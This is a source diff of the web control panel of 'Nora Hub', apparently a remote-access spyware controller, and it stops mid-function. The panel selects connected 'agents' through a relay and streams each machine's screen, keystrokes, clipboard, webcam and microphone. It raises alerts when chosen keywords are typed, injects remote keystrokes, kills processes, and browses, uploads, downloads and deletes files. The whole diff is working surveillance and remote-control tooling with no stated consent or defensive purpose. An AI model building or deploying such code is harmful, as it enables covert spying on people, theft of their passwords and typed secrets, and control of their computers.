@@ -3,16 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Nora Monitor</title>
+<title>Nora Hub</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
   body { background:#0d0d0d; color:#e0e0e0; font-family:'Consolas',monospace; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
-
-  #ngrok-bar { background:#0f1f0f; border-bottom:1px solid #1a3a1a; padding:5px 16px; font-size:12px; display:none; align-items:center; gap:10px; flex-shrink:0; }
-  #ngrok-bar.visible { display:flex; }
-  #ngrok-url { color:#7c6aff; font-weight:bold; cursor:pointer; text-decoration:underline; }
-  #ngrok-copy { background:none; border:1px solid #1a6640; color:#4ade80; padding:2px 8px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; }
-  #ngrok-copy:hover { background:#1a6640; }
 
   #topbar { background:#1a1a1a; border-bottom:1px solid #2a2a2a; padding:8px 16px; display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap; }
   #topbar h1 { font-size:14px; color:#7c6aff; letter-spacing:2px; text-transform:uppercase; }
@@ -20,18 +14,25 @@
   #status.connected { color:#4ade80; }
   #status.disconnected { color:#f87171; }
   #fps-info { font-size:11px; color:#555; }
-  #rec-timer { font-size:11px; color:#f87171; font-weight:bold; display:none; }
-  #rec-timer.visible { display:block; }
-  #no-fsa-msg { font-size:11px; color:#f87171; display:none; }
+
+  #agent-select { background:#1a1a1a; border:1px solid #333; color:#e0e0e0; padding:4px 10px; border-radius:6px; font-family:inherit; font-size:12px; cursor:pointer; }
+  #agent-select option { background:#1a1a1a; }
+  #no-agents { font-size:12px; color:#555; display:none; }
 
   .topbar-btn { padding:4px 14px; border-radius:6px; border:none; font-size:12px; font-family:inherit; cursor:pointer; letter-spacing:1px; transition:background .2s,color .2s; }
-  #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
-  #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
-  #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
   #cam-btn { background:#2a2a2a; color:#aaa; }
   #cam-btn.active { background:#1a6640; color:#4ade80; }
   #cam-btn:hover:not(.active) { background:#1a6640; color:#4ade80; }
   #cam-btn.active:hover { background:#c0392b; color:#fff; }
+  #mic-btn { background:#2a2a2a; color:#aaa; }
+  #mic-btn.active { background:#1a3366; color:#60a5fa; animation:pulse 1.2s infinite; }
+  #mic-btn:hover:not(.active) { background:#1a3366; color:#60a5fa; }
+  #mic-btn.active:hover { background:#c0392b; color:#fff; }
+  #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
+  #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
+  #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
+  #rec-timer { font-size:11px; color:#f87171; font-weight:bold; display:none; }
+  #rec-timer.visible { display:block; }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
 
   #main { display:flex; flex:1; overflow:hidden; }
@@ -46,7 +47,6 @@
   #camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
   #cam-placeholder { color:#333; font-size:12px; }
 
-  /* ── Sidebar ── */
   #sidebar { width:320px; background:#111; border-left:1px solid #222; display:flex; flex-direction:column; flex-shrink:0; }
 
   .tab-bar { display:flex; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; }
@@ -57,7 +57,6 @@
   .tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
   .tab-panel.active { display:flex; }
 
-  /* Keylog tab */
   .panel-header { background:#1a1a1a; padding:7px 10px; font-size:10px; text-transform:uppercase; letter-spacing:1px; color:#7c6aff; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px; }
   #keylog { flex:1; overflow-y:auto; padding:10px; font-size:12px; line-height:1.7; word-break:break-all; color:#ccc; }
   #keylog::-webkit-scrollbar { width:4px; }
@@ -67,7 +66,6 @@
   .hdr-btn { background:none; border:1px solid #333; color:#666; padding:2px 7px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; white-space:nowrap; }
   .hdr-btn:hover { border-color:#7c6aff; color:#7c6aff; }
 
-  /* Keyword alerts */
   #alert-section { border-top:1px solid #222; padding:8px 10px; flex-shrink:0; }
   #alert-section label { font-size:10px; color:#555; text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; }
   #alert-input-row { display:flex; gap:5px; }
@@ -78,7 +76,6 @@
   .alert-tag { background:#1e1a3a; color:#7c6aff; font-size:10px; padding:2px 7px; border-radius:10px; cursor:pointer; }
   .alert-tag:hover { background:#c0392b; color:#fff; }
 
-  /* Clipboard tab */
   #clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:6px; }
   #clipboard-list::-webkit-scrollbar { width:4px; }
   #clipboard-list::-webkit-scrollbar-thumb { background:#333; }
@@ -87,7 +84,6 @@
   .clip-time { font-size:9px; color:#444; margin-bottom:3px; }
   .clip-text { white-space:pre-wrap; max-height:80px; overflow:hidden; }
 
-  /* Process tab */
   #proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid #222; flex-shrink:0; align-items:center; }
   #proc-search { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
   #proc-refresh { background:#2a2a2a; border:none; color:#aaa; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
@@ -104,30 +100,186 @@
   .proc-kill:hover { background:#c0392b; color:#fff; }
   .proc-header { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; padding:5px 10px; font-size:10px; color:#444; border-bottom:1px solid #2a2a2a; text-transform:uppercase; flex-shrink:0; }
 
-  /* Control panel */
   #control-panel { border-top:1px solid #222; padding:10px 12px; font-size:11px; color:#666; flex-shrink:0; }
   #control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; }
   #control-panel input[type=checkbox] { accent-color:#7c6aff; }
   .hotkey-hint { font-size:10px; color:#444; margin-top:5px; }
+
+  /* ── File Manager ──────────────────────────────────────────────────────── */
+  #fm-path-bar { display:flex; align-items:center; gap:5px; padding:6px 8px; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; flex-wrap:wrap; }
+  #fm-path-bar span { font-size:10px; color:#7c6aff; }
+  #fm-breadcrumb { flex:1; min-width:0; font-size:11px; color:#aaa; word-break:break-all; }
+  #fm-up-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:12px; font-family:inherit; flex-shrink:0; }
+  #fm-up-btn:hover { background:#7c6aff; color:#fff; }
+  #fm-upload-btn { background:#2a2a2a; border:none; color:#aaa; padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; }
+  #fm-upload-btn:hover { background:#1a6640; color:#4ade80; }
+
+  #fm-list { flex:1; overflow-y:auto; }
+  #fm-list::-webkit-scrollbar { width:4px; }
+  #fm-list::-webkit-scrollbar-thumb { background:#333; }
+  .fm-row { display:flex; align-items:center; gap:8px; padding:6px 10px; border-bottom:1px solid #1a1a1a; cursor:pointer; font-size:11px; }
+  .fm-row:hover { background:#151515; }
+  .fm-icon { font-size:13px; flex-shrink:0; }
+  .fm-name { flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#ddd; }
+  .fm-meta { font-size:10px; color:#555; flex-shrink:0; white-space:nowrap; }
+  .fm-actions { display:flex; gap:4px; flex-shrink:0; }
+  .fm-dl-btn { background:#1a2a3a; border:none; color:#60a5fa; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .fm-dl-btn:hover { background:#2563eb; color:#fff; }
+  .fm-del-btn { background:#3a1a1a; border:none; color:#f87171; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .fm-del-btn:hover { background:#c0392b; color:#fff; }
+  #fm-status { font-size:10px; color:#555; padding:5px 10px; text-align:center; flex-shrink:0; }
+
+  /* ── Desktop & window controls ─────────────────────────────────────────── */
+  #desktop-controls { display:flex; gap:5px; margin-top:7px; flex-wrap:wrap; align-items:center; }
+  .desk-btn { background:#1a1a2a; border:1px solid #2a2a4a; color:#a78bfa; padding:3px 9px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; white-space:nowrap; }
+  .desk-btn:hover { background:#2d2650; color:#fff; }
+  #win-picker { margin-top:7px; }
+  #win-picker-btn { background:#1a2a1a; border:1px solid #2a4a2a; color:#4ade80; padding:3px 9px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; }
+  #win-picker-btn:hover { background:#1e3a1e; }
+  #win-target-label { font-size:10px; color:#4ade80; margin-top:4px; word-break:break-all; display:none; }
+  #win-target-label span { color:#555; }
+
+  #win-modal { display:none; position:fixed; z-index:1000; inset:0; background:#000a; }
+  #win-modal-box { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:#111; border:1px solid #333; border-radius:10px; width:380px; max-height:60vh; display:flex; flex-direction:column; font-family:Consolas,monospace; }
+  #win-modal-title { padding:10px 14px; background:#1a1a1a; border-radius:10px 10px 0 0; font-size:12px; color:#aaa; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; }
+  #win-modal-close { background:none; border:none; color:#555; font-size:16px; cursor:pointer; }
+  #win-modal-close:hover { color:#f87171; }
+  #win-list { overflow-y:auto; flex:1; }
+  #win-list::-webkit-scrollbar { width:4px; }
+  #win-list::-webkit-scrollbar-thumb { background:#333; }
+  .win-row { padding:8px 14px; cursor:pointer; font-size:11px; color:#ccc; border-bottom:1px solid #1a1a1a; display:flex; align-items:center; gap:8px; }
+  .win-row:hover { background:#1e1e1e; color:#fff; }
+  .win-row.selected { background:#1a2a1a; color:#4ade80; }
+  .win-hwnd { font-size:9px; color:#444; flex-shrink:0; }
+  #win-clear-btn { margin:8px 14px; background:#2a1a1a; border:none; color:#f87171; padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:Consolas,monospace; }
+  #win-clear-btn:hover { background:#3a1a1a; }
+
+  /* ── Remote Keyboard window ─────────────────────────────────────────────── */
+  #kbd-window {
+    display:none; position:fixed; z-index:999;
+    background:#111; border:1px solid #333; border-radius:10px;
+    box-shadow:0 8px 32px #000a; width:320px;
+    font-family:Consolas,monospace; user-select:none;
+    left:50%; top:50%; transform:translate(-50%,-50%);
+  }
+  #kbd-titlebar {
+    display:flex; align-items:center; padding:9px 12px;
+    background:#1a1a1a; border-radius:10px 10px 0 0;
+    cursor:grab; gap:8px; border-bottom:1px solid #222;
+  }
+  #kbd-titlebar:active { cursor:grabbing; }
+  #kbd-title { flex:1; font-size:12px; color:#aaa; letter-spacing:1px; }
+  #kbd-close { background:none; border:none; color:#555; font-size:16px; cursor:pointer; padding:0; line-height:1; }
+  #kbd-close:hover { color:#f87171; }
+  #kbd-indicator {
+    display:flex; align-items:center; gap:6px; padding:8px 12px;
+    font-size:11px; color:#555; border-bottom:1px solid #1a1a1a;
+  }
+  #kbd-dot { width:7px; height:7px; border-radius:50%; background:#333; flex-shrink:0; transition:background .1s; }
+  #kbd-dot.active { background:#4ade80; box-shadow:0 0 6px #4ade8099; }
+  #kbd-last { flex:1; color:#7c6aff; font-size:11px; min-height:14px; }
+  #kbd-box {
+    width:100%; box-sizing:border-box; padding:10px 12px;
+    background:#0d0d0d; border:none; border-radius:0 0 10px 10px;
+    color:#e0e0e0; font-family:Consolas,monospace; font-size:13px;
+    resize:none; outline:none; height:90px;
+    caret-color:#7c6aff;
+  }
+  #kbd-box::placeholder { color:#333; }
+  #kbd-hint { padding:6px 12px 10px; font-size:10px; color:#333; text-align:center; }
+  #kbd-toggle-btn {
+    background:#1e1a2e; border:1px solid #3a3060; color:#a78bfa;
+    padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px;
+    font-family:Consolas,monospace; margin-top:5px;
+  }
+  #kbd-toggle-btn:hover { background:#2d2650; }
+
+  /* ── Mobile ──────────────────────────────────────────────────────────────── */
+  #sidebar-handle { display:none; }
+
+  @media (max-width: 768px) {
+    body { touch-action: manipulation; }
+
+    #topbar { padding:6px 10px; gap:6px; }
+    #topbar h1 { font-size:12px; letter-spacing:1px; }
+    #fps-info, #no-agents { display:none; }
+    #status { font-size:11px; padding:3px 8px; }
+    #agent-select { flex:1; min-width:0; font-size:12px; }
+    .topbar-btn { padding:6px 9px; font-size:11px; letter-spacing:0; min-height:34px; touch-action:manipulation; }
+    #rec-btn { margin-left:0; }
+    #rec-timer { display:none !important; }
+
+    #main { flex-direction:column; }
+
+    #view-area { height:52vh; flex:none; overflow:hidden; }
+    #screen-panel { flex:1; }
+    #camera-panel { height:110px; }
+
+    #sidebar {
+      width:100%;
+      flex:none;
+      height:48vh;
+      border-left:none;
+      border-top:2px solid #2a2a2a;
+      transition:height .25s ease;
+      overflow:hidden;
+    }
+    #sidebar.collapsed { height:38px; }
+
+    #sidebar-handle {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:0 12px;
+      height:38px;
+      background:#1a1a1a;
+      border-bottom:1px solid #2a2a2a;
+      cursor:pointer;
+      flex-shrink:0;
+      user-select:none;
+      -webkit-user-select:none;
+    }
+    #sidebar-handle span { font-size:10px; color:#7c6aff; text-transform:uppercase; letter-spacing:1px; }
+    #sidebar-handle svg { width:14px; height:14px; fill:#555; transition:transform .25s; }
+    #sidebar.collapsed #sidebar-handle svg { transform:rotate(180deg); }
+
+    .tab-bar { display:none; }
+    #sidebar:not(.collapsed) .tab-bar { display:flex; }
+
+    .tab { padding:9px 4px; min-height:36px; font-size:10px; }
+
+    #control-panel { padding:6px 10px; }
+    .hotkey-hint { display:none; }
+
+    .proc-row { grid-template-columns:1fr 40px 46px 34px; }
+    .proc-kill { padding:3px 5px; min-height:28px; touch-action:manipulation; }
+
+    .clip-item { padding:8px 10px; }
+    .hdr-btn { padding:4px 9px; min-height:28px; touch-action:manipulation; }
+
+    #alert-input { font-size:13px; padding:5px 8px; }
+    #alert-add-btn { padding:5px 10px; font-size:12px; touch-action:manipulation; }
+  }
+
+  @media (max-width: 480px) {
+    .topbar-btn .btn-label { display:none; }
+  }
 </style>
 </head>
 <body>
 
-<div id="ngrok-bar">
-  <span style="color:#4ade80">🌐 Remote URL:</span>
-  <span id="ngrok-url" onclick="copyNgrok()">waiting...</span>
-  <button id="ngrok-copy" onclick="copyNgrok()">Copy</button>
-  <span style="font-size:10px;color:#2a5a2a;">← open on your phone</span>
-</div>
-
 <div id="topbar">
-  <h1>Nora Monitor</h1>
+  <h1>Nora Hub</h1>
   <span id="status" class="disconnected">Disconnected</span>
+  <select id="agent-select" onchange="selectAgent(this.value)">
+    <option value="">— no agents —</option>
+  </select>
+  <span id="no-agents" style="font-size:11px;color:#555;display:none;">Waiting for agents…</span>
   <span id="fps-info">-- fps</span>
   <span id="rec-timer"></span>
-  <span id="no-fsa-msg">Use Chrome/Edge to record</span>
-  <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 Camera</button>
-  <button id="rec-btn" class="topbar-btn" onclick="toggleRecord()">⏺ REC</button>
+  <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 <span class="btn-label">Camera</span></button>
+  <button id="mic-btn" class="topbar-btn" onclick="toggleMic()">🎙 <span class="btn-label">Mic</span></button>
+  <button id="rec-btn" class="topbar-btn" onclick="toggleRecord()">⏺ <span class="btn-label">REC</span></button>
 </div>
 
 <div id="main">
@@ -143,14 +295,17 @@
   </div>
 
   <div id="sidebar">
-    <!-- Tab bar -->
+    <div id="sidebar-handle" onclick="toggleSidebar()">
+      <span>Logs &amp; Controls</span>
+      <svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5z"/></svg>
+    </div>
     <div class="tab-bar">
       <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
       <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
       <div class="tab" onclick="switchTab('processes')">Processes</div>
+      <div class="tab" onclick="switchTab('files')">Files</div>
     </div>
 
-    <!-- Keylog tab -->
     <div id="tab-keylog" class="tab-panel active">
       <div class="panel-header">
         Keylog
@@ -170,7 +325,6 @@
       </div>
     </div>
 
-    <!-- Clipboard tab -->
     <div id="tab-clipboard" class="tab-panel">
       <div class="panel-header">
         Clipboard History
@@ -179,7 +333,6 @@
       <div id="clipboard-list"><span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span></div>
     </div>
 
-    <!-- Processes tab -->
     <div id="tab-processes" class="tab-panel">
       <div id="proc-controls">
         <input id="proc-search" placeholder="Search process..." oninput="filterProcs()">
@@ -189,70 +342,200 @@
       <div id="proc-list"></div>
     </div>
 
+    <div id="tab-files" class="tab-panel">
+      <div id="fm-path-bar">
+        <span>📂</span>
+        <div id="fm-breadcrumb">/</div>
+        <button id="fm-up-btn" onclick="fmUp()" title="Up">↑ Up</button>
+        <label id="fm-upload-btn" title="Upload file">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
+      </div>
+      <div id="fm-list"><div id="fm-status">Select an agent and open Files tab</div></div>
+    </div>
+
     <div id="control-panel">
       <label><input type="checkbox" id="ctrl-toggle" checked> Remote control active</label>
       <div class="hotkey-hint">Ctrl+Shift+D — toggle control</div>
+      <button id="kbd-toggle-btn" onclick="toggleKbd()" title="Open remote keyboard window">⌨ Remote Keyboard</button>
+
+      <div id="desktop-controls">
+        <span style="font-size:10px;color:#444;">Desktops:</span>
+        <button class="desk-btn" onclick="desktopCmd('new')" title="New desktop (Win+Ctrl+D)">⊞ New</button>
+        <button class="desk-btn" onclick="desktopCmd('left')" title="Switch left">◀</button>
+        <button class="desk-btn" onclick="desktopCmd('right')" title="Switch right">▶</button>
+        <button class="desk-btn" onclick="desktopCmd('close')" title="Close desktop" style="color:#f87171;border-color:#4a2a2a;">✕</button>
+      </div>
+
+      <div id="win-picker">
+        <button id="win-picker-btn" onclick="openWinPicker()">🎯 Pick Target Window</button>
+        <div id="win-target-label"><span>Target: </span><span id="win-target-title">—</span></div>
+      </div>
     </div>
   </div>
 </div>
 
+<!-- Window picker modal -->
+<div id="win-modal" onclick="if(event.target===this)closeWinPicker()">
+  <div id="win-modal-box">
+    <div id="win-modal-title">
+      <span>🎯 Pick Target Window</span>
+      <button id="win-modal-close" onclick="closeWinPicker()">✕</button>
+    </div>
+    <div id="win-list"></div>
+    <button id="win-clear-btn" onclick="clearWinTarget()">✕ Clear target (use normal control)</button>
+  </div>
+</div>
+
+<!-- Remote Keyboard floating window -->
+<div id="kbd-window">
+  <div id="kbd-titlebar" onmousedown="kbdDragStart(event)">
+    <span>⌨</span>
+    <span id="kbd-title">REMOTE KEYBOARD</span>
+    <button id="kbd-close" onclick="toggleKbd()">✕</button>
+  </div>
+  <div id="kbd-indicator">
+    <div id="kbd-dot"></div>
+    <span id="kbd-last">Type below — keys go to remote PC</span>
+  </div>
+  <textarea id="kbd-box" placeholder="Click here and start typing…" spellcheck="false" autocorrect="off" autocomplete="off"></textarea>
+  <div id="kbd-hint">Keys are sent live · textarea clears automatically</div>
+</div>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
 <script>
-const canvas     = document.getElementById("screen");
-const ctx        = canvas.getContext("2d");
-const keylogEl   = document.getElementById("keylog");
-const statusEl   = document.getElementById("status");
-const fpsEl      = document.getElementById("fps-info");
-const cursorEl   = document.getElementById("cursor");
-const ctrlToggle = document.getElementById("ctrl-toggle");
-const screenPanel= document.getElementById("screen-panel");
-const recBtn     = document.getElementById("rec-btn");
-const recTimer   = document.getElementById("rec-timer");
-const camBtn     = document.getElementById("cam-btn");
-const camPanel   = document.getElementById("camera-panel");
-const camFeed    = document.getElementById("camera-feed");
-const camPlaceholder = document.getElementById("cam-placeholder");
-const ngrokBar   = document.getElementById("ngrok-bar");
-const ngrokUrlEl = document.getElementById("ngrok-url");
-const noFsaMsg   = document.getElementById("no-fsa-msg");
+const RELAY = window.location.origin;
 
-const socket = io();
+const canvas      = document.getElementById("screen");
+const ctx         = canvas.getContext("2d");
+const keylogEl    = document.getElementById("keylog");
+const statusEl    = document.getElementById("status");
+const fpsEl       = document.getElementById("fps-info");
+const cursorEl    = document.getElementById("cursor");
+const ctrlToggle  = document.getElementById("ctrl-toggle");
+const screenPanel = document.getElementById("screen-panel");
+const recBtn      = document.getElementById("rec-btn");
+const recTimer    = document.getElementById("rec-timer");
+const camBtn      = document.getElementById("cam-btn");
+const camPanel    = document.getElementById("camera-panel");
+const camFeed     = document.getElementById("camera-feed");
+const camPlaceholder = document.getElementById("cam-placeholder");
+const agentSelect = document.getElementById("agent-select");
+
+let selectedAgent = "";
 let frameCount = 0, lastFpsTime = Date.now();
 let cameraActive = false;
+let micActive = false;
 let allProcs = [];
 let alertKeywords = [];
 let keylogText = "";
 
+const socket = io(RELAY, { transports: ["polling", "websocket"] });
+
+// ── Audio ─────────────────────────────────────────────────────────────────────
+let audioCtx = null, audioNextTime = 0;
+const SAMPLE_RATE = 16000;
+const micBtn = document.getElementById("mic-btn");
+
+function getAudioCtx() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
+  if (audioCtx.state === "suspended") audioCtx.resume();
+  return audioCtx;
+}
+
+socket.on("audio", d => {
+  if (d._agent !== selectedAgent || !micActive) return;
+  try {
+    const ctx = getAudioCtx();
+    const binary = atob(d.data);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    const samples = new Int16Array(bytes.buffer);
+    const f32 = new Float32Array(samples.length);
+    for (let i = 0; i < samples.length; i++) f32[i] = samples[i] / 32768;
+    const buf = ctx.createBuffer(1, f32.length, SAMPLE_RATE);
+    buf.copyToChannel(f32, 0);
+    const src = ctx.createBufferSource();
+    src.buffer = buf;
+    src.connect(ctx.destination);
+    const now = ctx.currentTime;
+    if (audioNextTime < now + 0.05) audioNextTime = now + 0.05;
+    src.start(audioNextTime);
+    audioNextTime += buf.duration;
+  } catch(e) {}
+});
+
+function toggleMic() {
+  if (!selectedAgent) return;
+  if (micActive) {
+    socket.emit("mic_off", { _target: selectedAgent });
+    micActive = false;
+    micBtn.innerHTML = "🎙 <span class='btn-label'>Mic</span>";
+    micBtn.className = "topbar-btn";
+    audioNextTime = 0;
+  } else {
+    socket.emit("mic_on", { _target: selectedAgent });
+    micActive = true;
+    micBtn.innerHTML = "🎙 <span class='btn-label'>Mic ON</span>";
+    micBtn.className = "topbar-btn active";
+    getAudioCtx();
+  }
+}
+
+// ── Connection ────────────────────────────────────────────────────────────────
+socket.on("connect", () => {
+  statusEl.textContent = "Connected";
+  statusEl.className = "connected";
+  socket.emit("hub_join", {});
+});
+socket.on("disconnect", () => {
+  statusEl.textContent = "Disconnected";
+  statusEl.className = "disconnected";
+});
+
+// ── Agent list ────────────────────────────────────────────────────────────────
+socket.on("agent_list", agents => {
+  const prev = selectedAgent;
+  agentSelect.innerHTML = agents.length
+    ? agents.map(a => `<option value="${escAttr(a.name)}">${escHtml(a.name)}</option>`).join("")
+    : '<option value="">— no agents —</option>';
+  if (prev && agents.find(a => a.name === prev)) {
+    agentSelect.value = prev;
+  } else if (agents.length) {
+    selectedAgent = agents[0].name;
+    agentSelect.value = selectedAgent;
+  } else {
+    selectedAgent = "";
+  }
+});
+
+function selectAgent(name) {
+  selectedAgent = name;
+  clearLog();
+  clearClipboard();
+}
+
+function target() { return selectedAgent; }
+
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(name) {
-  document.querySelectorAll(".tab").forEach((t,i) => {
-    const names = ["keylog","clipboard","processes"];
+  const names = ["keylog", "clipboard", "processes", "files"];
+  document.querySelectorAll(".tab").forEach((t, i) => {
     t.className = "tab" + (names[i] === name ? " active" : "");
   });
   document.querySelectorAll(".tab-panel").forEach(p => p.className = "tab-panel");
   document.getElementById("tab-" + name).className = "tab-panel active";
   if (name === "processes") loadProcs();
+  if (name === "files") fmLoadDir(fmCurPath || null);
 }
-
-// ── Ngrok ─────────────────────────────────────────────────────────────────────
-function copyNgrok() {
-  const url = ngrokUrlEl.textContent;
-  if (url && url !== "waiting...") {
-    navigator.clipboard.writeText(url);
-    document.getElementById("ngrok-copy").textContent = "Copied!";
-    setTimeout(() => document.getElementById("ngrok-copy").textContent = "Copy", 2000);
-  }
-}
-socket.on("ngrok_url", d => { ngrokBar.className = "visible"; ngrokUrlEl.textContent = d.url; });
-
-// ── Connection ────────────────────────────────────────────────────────────────
-socket.on("connect",    () => { statusEl.textContent = "Connected";    statusEl.className = "connected"; });
-socket.on("disconnect", () => { statusEl.textContent = "Disconnected"; statusEl.className = "disconnected"; });
 
 // ── Screen ────────────────────────────────────────────────────────────────────
 const frameImg = new Image();
-frameImg.onload = () => { canvas.width = frameImg.naturalWidth; canvas.height = frameImg.naturalHeight; ctx.drawImage(frameImg, 0, 0); };
+frameImg.onload = () => {
+  canvas.width = frameImg.naturalWidth;
+  canvas.height = frameImg.naturalHeight;
+  ctx.drawImage(frameImg, 0, 0);
+};
 socket.on("frame", d => {
+  if (d._agent !== selectedAgent) return;
   frameImg.src = "data:image/jpeg;base64," + d.data;
   frameCount++;
   const now = Date.now();
@@ -261,8 +544,9 @@ socket.on("frame", d => {
 
 // ── Keylog ────────────────────────────────────────────────────────────────────
 socket.on("key", d => {
+  if (d._agent !== selectedAgent) return;
   const char = d.char;
-  keylogText += char === "[ENTER]" ? "\n" : char.startsWith("[") && char.endsWith("]") ? char : char;
+  keylogText += char === "[ENTER]" ? "\n" : char;
   const span = document.createElement("span");
   if (char === "[ENTER]") { span.className = "key-special key-enter"; span.textContent = char + "\n"; }
   else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
@@ -273,7 +557,6 @@ socket.on("key", d => {
 });
 
 function clearLog() { keylogEl.innerHTML = ""; keylogText = ""; }
-
 function saveLog() {
   const blob = new Blob([keylogText], { type: "text/plain" });
   const a = document.createElement("a");
@@ -292,19 +575,12 @@ function addAlert() {
   renderAlertTags();
   Notification.requestPermission();
 }
-
 function renderAlertTags() {
-  const el = document.getElementById("alert-tags");
-  el.innerHTML = alertKeywords.map(k =>
-    `<span class="alert-tag" onclick="removeAlert('${k}')" title="Click to remove">${k} ✕</span>`
+  document.getElementById("alert-tags").innerHTML = alertKeywords.map(k =>
+    `<span class="alert-tag" onclick="removeAlert('${escAttr(k)}')" title="Click to remove">${escHtml(k)} ✕</span>`
   ).join("");
 }
-
-function removeAlert(kw) {
-  alertKeywords = alertKeywords.filter(k => k !== kw);
-  renderAlertTags();
-}
-
+function removeAlert(kw) { alertKeywords = alertKeywords.filter(k => k !== kw); renderAlertTags(); }
 let _lastAlertAt = {};
 function checkAlerts(text) {
   const lower = text.toLowerCase();
@@ -313,9 +589,8 @@ function checkAlerts(text) {
       const now = Date.now();
       if (!_lastAlertAt[kw] || now - _lastAlertAt[kw] > 10000) {
         _lastAlertAt[kw] = now;
-        if (Notification.permission === "granted") {
-          new Notification("Nora Monitor — Keyword Detected", { body: `"${kw}" was typed`, icon: "" });
-        }
+        if (Notification.permission === "granted")
+          new Notification("Nora Hub — Keyword Detected", { body: `"${kw}" was typed` });
       }
     }
   });
@@ -324,74 +599,82 @@ function checkAlerts(text) {
 // ── Clipboard ─────────────────────────────────────────────────────────────────
 const clipList = document.getElementById("clipboard-list");
 let clipItems = [];
-
 socket.on("clipboard", d => {
+  if (d._agent !== selectedAgent) return;
   clipItems.unshift({ text: d.text, time: new Date().toLocaleTimeString() });
   if (clipItems.length > 100) clipItems.pop();
   renderClipboard();
 });
-
 function renderClipboard() {
   if (!clipItems.length) { clipList.innerHTML = '<span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span>'; return; }
   clipList.innerHTML = clipItems.map((c, i) =>
     `<div class="clip-item" onclick="copyClipItem(${i})">
       <div class="clip-time">${c.time} — click to copy</div>
-      <div class="clip-text">${escHtml(c.text.slice(0, 300))}${c.text.length > 300 ? "…" : ""}</div>
+      <div class="clip-text">${escHtml(c.text.slice(0,300))}${c.text.length>300?"…":""}</div>
     </div>`
   ).join("");
 }
-
-function copyClipItem(i) {
-  navigator.clipboard.writeText(clipItems[i].text);
-}
-
+function copyClipItem(i) { navigator.clipboard.writeText(clipItems[i].text); }
 function clearClipboard() { clipItems = []; renderClipboard(); }
 
-function escHtml(s) {
-  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
-}
-
 // ── Processes ─────────────────────────────────────────────────────────────────
-async function loadProcs() {
-  const r = await fetch("/processes");
-  allProcs = await r.json();
-  filterProcs();
+function loadProcs() {
+  if (!selectedAgent) return;
+  socket.emit("get_processes", { _target: selectedAgent });
 }
-
+socket.on("processes_result", d => {
+  allProcs = d.processes || [];
+  filterProcs();
+});
 function filterProcs() {
   const q = document.getElementById("proc-search").value.toLowerCase();
   const filtered = q ? allProcs.filter(p => p.name.toLowerCase().includes(q)) : allProcs;
   document.getElementById("proc-list").innerHTML = filtered.map(p =>
     `<div class="proc-row">
-      <span class="proc-name" title="${escHtml(p.name)}">${escHtml(p.name)}</span>
+      <span class="proc-name" title="${escAttr(p.name)}">${escHtml(p.name)}</span>
       <span class="proc-cpu">${p.cpu}%</span>
       <span class="proc-mem">${p.mem}MB</span>
       <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>
     </div>`
   ).join("");
 }
-
-async function killProc(pid) {
+function killProc(pid) {
